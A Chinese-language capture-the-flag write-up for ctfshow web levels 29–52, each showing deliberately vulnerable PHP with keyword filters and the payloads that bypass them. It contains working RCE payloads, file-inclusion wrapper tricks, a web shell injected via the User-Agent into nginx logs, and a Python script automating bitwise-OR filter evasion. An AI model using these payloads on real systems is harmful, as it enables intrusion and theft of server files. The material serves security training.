# ctfshow-web(命令执行)

### web29

#### eval($c)漏洞(/flag/i)

![image-20251128221745153](ctfshow-web(命令执行).assets/image-20251128221745153.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```php
!preg_match("/flag/i", $c)
如果输入中包含 flag（不区分大小写），就禁止执行。

eval() 直接执行你输入的 PHP 代码
```

1、**直接执行系统命令**

```
?c=system("tac fla*");
```

![image-20251128223543394](ctfshow-web(命令执行).assets/image-20251128223543394.png)

**2，内敛执行** 

```
?c=echo `tac fl*`;
```

![image-20251128223558564](ctfshow-web(命令执行).assets/image-20251128223558564.png)

**3**，**利用参数输入**+eval

```
?c=eval($_GET[1]);&1=phpinfo();
```

![image-20251128223711156](ctfshow-web(命令执行).assets/image-20251128223711156.png)

**4，利用cp命令将flag拷贝到别处**

```
？c=system("cp fl*g.php a.txt");
然后访问
```

![image-20251128223503940](ctfshow-web(命令执行).assets/image-20251128223503940.png)

```
ctfshow{921a5be1-2428-45cb-9eba-b9a9d43a59ef}
```



### web30

#### eval($c)漏洞(/flag|system|php/i)

![image-20251128224043707](ctfshow-web(命令执行).assets/image-20251128224043707.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**exp**

**内敛执行** 

```
?c=echo `tac fl*`;
```

![image-20251128224314600](ctfshow-web(命令执行).assets/image-20251128224314600.png)

```
ctfshow{df3c4621-c51b-42e3-a0a1-64812e40ae28}
```



**passthru**

这是 PHP 的一个函数，作用是**执行系统命令，并将输出直接返回给浏览器**。

```
?c=passthru("tac fla*");
```



**字符串拼接**

```
字符串拼接的方式动态构造出函数名 system，然后执行系统命令 tac fla*


```

**shell_exec**

```
?c=echo shell_exec("tac fla*");
```

![image-20251128225539738](ctfshow-web(命令执行).assets/image-20251128225539738.png)





**二阶注入式 RCE**

```
?c=eval($_GET[1]);&1=system("tac fla*");
```

![image-20251128225815586](ctfshow-web(命令执行).assets/image-20251128225815586.png)

```
ctfshow{df3c4621-c51b-42e3-a0a1-64812e40ae28}
```







### web31

#### /flag|system|php|cat|sort|shell|\.| |\'/i

![image-20251128230104009](ctfshow-web(命令执行).assets/image-20251128230104009.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**二阶注入式 RCE**

```
?c=eval($_GET[1]);&1=system("tac fla*");
```

![image-20251128230224420](ctfshow-web(命令执行).assets/image-20251128230224420.png)



**passthru**

这是 PHP 的一个函数，作用是**执行系统命令，并将输出直接返回给浏览器**。

用%0代替空格完成命令注入。

```
?c=passthru("tac%09fla*");
```



**base64绕过**

- `highlight_file()` 是 PHP 内置函数，**会把指定文件的内容以语法高亮形式输出**；
- ZmxhZy5waHA=解密后是flag.php
- **把 `flag.php` base64 编码后再解码，从而避免直接写出敏感词，实现“无关键字读取 flag 文件”**

```
?c=highlight_file(base64_decode("ZmxhZy5waHA="));
```

![image-20251128230850450](ctfshow-web(命令执行).assets/image-20251128230850450.png)

```
ctfshow(df3c4621-c51b-42e3-a0a1-64812e40ae28)
```





### web32

#### **文件包含******伪协议 + 二次参数**

![image-20251128231540520](ctfshow-web(命令执行).assets/image-20251128231540520.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤掉了flag|system|php|cat|sort|shell|.| |'|`|echo|;|( 包括点，单引号，反引号，分号，括号
再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了，但是php中也有不需要括号的函数，如：
echo 123;

**如果不知道flag在哪个文件时候**

```
在不知道flag的位置的前提下，使用文件包含+日志注入的方式 文件包含 ?c=includ e"$_GET[a]"?>&a=/var/log/nginx/access.log 通过观察日志

在 UA 里写入一句话木马：
User-Agent: <?php @eval($_POST['x']);?>
发一次包，日志里就多了这一行 PHP 代码。
现在日志文件已经变成合法的 PHP 文件（混合文本+PHP 标签）。
再次访问：
?c=include"$_GET[a]"?>&a=/var/log/nginx/access.log
```

![image-20251128234302430](ctfshow-web(命令执行).assets/image-20251128234302430.png)



![image-20251128234238508](ctfshow-web(命令执行).assets/image-20251128234238508.png)





**文件包含******伪协议 + 二次参数**

```
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

 ?>作用：用来闭合当前页面的<?php，使后面的部分可以正常作为url参数传入1
把 include + 第二个参数埋进 $c，让题目 eval() 不会匹配到 flag；
把真正要包含的文件路径通过伪协议传进去，先 base64 编码再输出，这样就不会直接执行 PHP，而是拿到源码。
```

![image-20251128232317412](ctfshow-web(命令执行).assets/image-20251128232317412.png)

![image-20251128232350500](ctfshow-web(命令执行).assets/image-20251128232350500.png)

```
ctfshow{378550b5-0ad1-4e20-ad9c-9f5d0aa2b24e}
```





### web33

#### **文件包含******伪协议 + 二次参数**

![image-20251215124819299](ctfshow-web(命令执行).assets/image-20251215124819299.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 02:22:27
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
//
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
前一关相比，貌似就多过滤了一给分号

php中不需要括号的函数，如：
echo 123;
print 123;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "etc/passwd";

这里我们利用include构造payload
url/?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
其中?>代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag
还有一种方法，日志注入
url/?c=include$_GET[1]?%3E&1=../../../../var/log/nginx/access.log
/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可
```



**文件包含******伪协议 + 二次参数**

```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

 ?>作用：用来闭合当前页面的<?php，使后面的部分可以正常作为url参数传入1
把 include + 第二个参数埋进 $c，让题目 eval() 不会匹配到 flag；
把真正要包含的文件路径通过伪协议传进去，先 base64 编码再输出，这样就不会直接执行 PHP，而是拿到源码。
```

```
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7OGZkZTRiZDMtNmI0Yi00ZDZjLWE0NTUtZmFhMjBjZmNhMWFlfSI7DQo=
```

![image-20251215125052160](ctfshow-web(命令执行).assets/image-20251215125052160.png)

```
ctfshow{8fde4bd3-6b4b-4d6c-a455-faa20cfca1ae}
```



### web34

#### **文件包含******伪协议 + 二次参数**

![image-20251215125752787](ctfshow-web(命令执行).assets/image-20251215125752787.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**文件包含\******伪协议 + 二次参数**

```
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

![image-20251215130042914](ctfshow-web(命令执行).assets/image-20251215130042914.png)

![image-20251215130035652](ctfshow-web(命令执行).assets/image-20251215130035652.png)

```
ctfshow{12d2efdf-2c61-4653-afee-861d36ed9414}
```





### web35

![image-20251215130341406](ctfshow-web(命令执行).assets/image-20251215130341406.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

##### **data:// 伪协议 + 内嵌 PHP 代码**

```
?c=include $_GET[1]?>&1=data://text/plain,<?php system("tac fla*");?>



这里命令执行发生在「PHP 脚本层」，是 include 把攻击者自己写的 PHP 代码拉进来执行，而不是在 shell 里拼接命令。
所以它属于「代码注入（Code Injection）」或「文件包含利用」，不是传统意义上通过 ;、&&、反引号等拼接出来的「命令注入（Command Injection）」。
```





**文件包含+伪协议+二次参数**

```
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

![image-20251215131639016](ctfshow-web(命令执行).assets/image-20251215131639016.png)

![image-20251215131701607](ctfshow-web(命令执行).assets/image-20251215131701607.png)

```
ctfshow{ed052c5a-ecc8-47db-a5d0-f684bdee7cab}
```



### web35

![image-20251215132020951](ctfshow-web(命令执行).assets/image-20251215132020951.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

还是一样

![image-20251215132200912](ctfshow-web(命令执行).assets/image-20251215132200912.png)

```
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php


参数不能是数字，那我们就直接用字母a
```

![image-20251215132430912](ctfshow-web(命令执行).assets/image-20251215132430912.png)

```
ctfshow{f922e981-c992-4ecd-a01c-52096f265b11}
```



### web36

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

好像不能直接用文件包含和为协议了

flag被过滤了

```
?c=php://filter/convert.base64-encode/resource=flag.php
```

这个会得不到想要的所所以得用别的办法



####  通配符 + 倒序输出

用这个

```php
?c=data://text/plain,<?=system("tac fla*");?>
```



1. `$c = $_GET['c'];`
   `include($c);`
   相当于 PHP 在执行时看到了一句：

php

复制

```php
include 'data://text/plain,<?=system("tac fla*");?>';
```

流解析 + 代码执行阶段 PHP 的 include 并不只是“把磁盘文件拉进来”，它会先根据 流封装器（stream wrapper） 判断协议：

发现是 data:// → 交给 data wrapper 处理。

```
data wrapper 把逗号后面的部分当成文件内容，凭空生成一个临时“虚拟文件”，内容就是
<?=system("tac fla*");?>
```

include 拿到这个虚拟文件后，**会把它当成 PHP 脚本直接执行**（因为内容开头就是 `<?`）

所以可以得到flag

![image-20251215133444473](ctfshow-web(命令执行).assets/image-20251215133444473.png)

```
ctfshow{eee13542-e1cf-45fc-9b84-494cb758f30c}
```



### web37

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

在上面37题的基础上增加了过滤php关键词

所以在上一期的payload中修改

####  通配符 + 倒序输出

但是php被禁止了所以只能用<?,这个在要php版本合适的情况下才能用

```php
?c=data://text/plain,<?=system("tac fla*")?>
```

![image-20251215140104369](ctfshow-web(命令执行).assets/image-20251215140104369.png)



```
ctfshow{a615352f-16a9-4040-b1d1-e98e6aa6889e}
```



### web38

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

####  通配符 + 倒序输出

```
?c=data://text/plain,<?=system("tac fla*")?>
```

![image-20251215142242958](ctfshow-web(命令执行).assets/image-20251215142242958.png)

```
ctfshow{9f9494b2-1045-4c23-85b3-b4f7848f9172}
```



### web39

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

思路：

```
正则把 0-9、字母、所有常用运算符、引号、斜杠、括号、点号 全部干掉，
传统异或、取反、短标签、data:// 统统阵亡。
唯一活口：中文括号 （ ） 被过滤，但英文 ( ) 没写进正则（注意正则里写的是 \（|\），是中文全角符号，而真正的英文括号 ( ) 并不在里面）。
```



#### **无字母数字 + 无可见符号**

```
?c=eval(next(reset(get_defined_vars())));&pay=system("tac flag.php");
```

//get_defined_vars()用于以数组的形式返回所有已定义的变量值（包括URL屁股后面接的pay），这里源码只定义了一个变量即c，加上你引入的pay就两个变量值了。reset用于将指向返回变量数组的指针指向第一个变量即c，next向前移动一位指针即pay，eval执行返回的值就是咱们定义的恶意代码。我这边去掉system()函数前的分号了，也能出结果。

![image-20251215151732750](ctfshow-web(命令执行).assets/image-20251215151732750.png)

```
ctfshow{9aca487d-b8c2-4dc1-a0c5-04fad1fd79bb}
```



### web40

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

#### **变量数组指针链**

和上一题类似

```
?c=eval(next(reset(get_defined_vars())));&pay=system("tac flag.php");
```

![image-20251215152225134](ctfshow-web(命令执行).assets/image-20251215152225134.png)

```
ctfshow{e4176c7c-5deb-4efa-ba04-89d1cf9c3982}
```





### web41

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

```
题目首先接收一个POST请求中名为’c’的参数，然后进行过滤，若未被过滤则执行 eval("echo($c);");

对于'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i'
该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、"^"、"+"、"~"、"$"、"["、"]"、"{"、"}"、"&" 或 "-"，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下"|"没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。
```



思路如下：

- 首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。
- 跟据题目要求，构造payload的原型，并将原型替换为或运算的结果
- 使用POST请求发送c,获取flag

通过他人的脚本可以

##### **无字母数字**按位 or 拼接**

```pthon
import re
import urllib
from urllib import parse
import requests

contents = []

for i in range(256):
    for j in range(256):
        hex_i = '{:02x}'.format(i)
        hex_j = '{:02x}'.format(j)
        preg = re.compile(r'[0-9]|[a-z]|\^|\+|~|\$|\[|]|\{|}|&|-', re.I)
        if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))):
            continue
        else:
            a = '%' + hex_i
            b = '%' + hex_j
            c = chr(int(a[1:], 16) | int(b[1:], 16))
            if 32 <= ord(c) <= 126:
                contents.append([c, a, b])


def make_payload(cmd):
    payload1 = ''
    payload2 = ''
    for i in cmd:
        for j in contents:
            if i == j[0]:
                payload1 += j[1]
                payload2 += j[2]
                break
    payload = '("' + payload1 + '"|"' + payload2 + '")'
    return payload


URL = input('url:')
payload = make_payload('system') + make_payload('cat flag.php')
response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
print(response.text)
```

预生成 0-255 两两组合，只要单个字符**不在**正则 `/[0-9a-z^+~$[\]{}&-]/i` 范围内，就记录它的 `%xx` 形式。

**按位 OR 拼接生成被禁字符，是经典的无字母数字绕过套路，这段代码就是自动化生成器。**

但是可能会报错 request好像带的url不能带https，有s直接删除

![image-20251215160232758](ctfshow-web(命令执行).assets/image-20251215160232758.png)

```
ctfshow{17f47459-1cda-4ab2-9a30-3d6c32eb728b}
```





###  system题型

```
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
```



### web42

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:51:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

/dev/null 2>&1是不进行回显，所以采用命令把flag打印出来，利用

##### 无回显的webshell

```
先查看文件
？c=ls；

再查看
?c=tac flag.php;
```

![image-20251215161205542](ctfshow-web(命令执行).assets/image-20251215161205542.png)

```
ctfshow{f0e27345-1cca-47bc-989a-be6be8f34677}
```





### web43



```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

##### ||绕过

过滤了cat、；，那就利用tac命令来打印，“||”分割

```
?c=ls||
```

![image-20251215161658672](ctfshow-web(命令执行).assets/image-20251215161658672.png)

```
?c=tac flag.php||
```

![image-20251215161720436](ctfshow-web(命令执行).assets/image-20251215161720436.png)

```
ctfshow{108f3c37-ca11-4595-8956-0cb656b5af79}
```



### web44

##### fla*.php绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

和上题类似只是加了过滤flag

```
?c=tac fla*.php ||
```

![image-20251215162646664](ctfshow-web(命令执行).assets/image-20251215162646664.png)

```
ctfshow{b7576d84-1c1c-4d3a-9ced-726b6f0650e2}
```



### web45

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

在之前的过滤基础上，把空格过滤了，所以可以采用“tab”但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录

##### 采用tab的url编码“%09”

```
?c=tac%09fla*||
```

![image-20251215163143661](ctfshow-web(命令执行).assets/image-20251215163143661.png)

```
ctfshow{f1786006-bc1d-47ec-8950-b9f5eb751260}
```





### web46

#### tac<fla''g.php||绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

| 字符/模式  | 被过滤的内容   | 说明                                              |
| :--------- | :------------- | :------------------------------------------------ |
| `\;`       | 分号 `;`       | 禁止**连续执行多条命令**（如 `id;whoami`）        |
| `cat`      | 字符串 `cat`   | 禁止直接用 `cat` 命令读文件                       |
| `flag`     | 字符串 `flag`  | 禁止出现单词 **flag**（通常用于隐藏 flag 文件名） |
| `（空格）` | 空格字符       | 禁止**空格**，防止传参或分隔命令                  |
| `[0-9]`    | 任何数字 `0-9` | 禁止数字，防止用 `cat flag9.txt` 这类文件名       |
| `\\$`      | 美元符号 `$`   | 禁止变量替换，如 `$PATH`、`$*`、`${IFS}` 等       |
| `\*`       | 星号 `*`       | 禁止通配符，如 `cat *` 或 `/bin/c*t`              |

我们用

```php
?c=tac<fla%27%27g.php||
?c=tac%09fla%27%27g.php||
    
%09绕过空格
    中间用''绕过*
tac<fla''g.php||
```

![image-20251215174532228](ctfshow-web(命令执行).assets/image-20251215174532228.png)

```
ctfshow{2a1a5f8b-a9ce-4fbc-9e05-dc5c7e5049d2}
```





### web47

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```



```
?c=tac<fla%27%27g.php||
```



![image-20251217094033189](ctfshow-web(命令执行).assets/image-20251217094033189.png)

```
ctfshow{5296a558-98f1-4a27-8232-14e948181be6}
```





### web48

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```



```
?c=tac<fla%27%27g.php||
```

![image-20251217094613337](ctfshow-web(命令执行).assets/image-20251217094613337.png)

```
ctfshow{d43b9fd1-3610-49b0-91d4-5b67a6d4d6bb}
```





### web49

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

和前几关一样

```
?c=tac<fla''g.php||
```

![image-20251218083412182](ctfshow-web(命令执行).assets/image-20251218083412182.png)

```
ctfshow{d04d3334-6865-49a6-a0d1-1897e209df09}
```



### web50

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

| `\x09` | Tab 字符（十六进制） | 不可见空白字符，可能绕过空格过滤 |
| ------ | -------------------- | -------------------------------- |
| `\x26` | `&` 符号（十六进制） | 用于后台执行命令，如 `cat flag&` |

```
?c=tac<fla''g.php||
```

![image-20251218084713311](ctfshow-web(命令执行).assets/image-20251218084713311.png)

```
ctfshow{53d040e7-fbf5-434a-ba9e-9cbe31210c9b}
```





### web51

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**这次直接过滤了我的tac**

```
?c=t''ac<fla''g.php||


''用单引号分割一下
```

我们直接用

![image-20251218085858985](ctfshow-web(命令执行).assets/image-20251218085858985.png)





### web52

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

现在直接过滤了我的

```
< 和>
```

接下来我们要找<的替代品，或者 空格 的另一种绕过方式；

> < &被过滤了，就用${IFS}
> ${IFS} 的含义：IFS 全称为 “Internal Field Separator”（内部字段分隔符），默认值包含空格、制表符和换行符。在命令行里，${IFS} 可以用来替代空格。
> 原因：正则表达式过滤了空格字符 ，但没有对 ${IFS} 进行过滤。
> 所以，当把命令写成ls${IFS}-l时，在正则表达式的检查中，因为不存在被过滤的空格字符，该命令就能通过检查。

```
?c=t''ac${IFS}f''lag.php||
```

![image-20251218092257386](ctfshow-web(命令执行).assets/image-20251218092257386.png)

发现没有得到正确的访问



所以我们去查看别的文件的目录

```
# 查看根目录查看
?c=ls${IFS}/||
```

```
?c=t''ac${IFS}/f''lag||
?c=c''at${IFS}/f''lag||
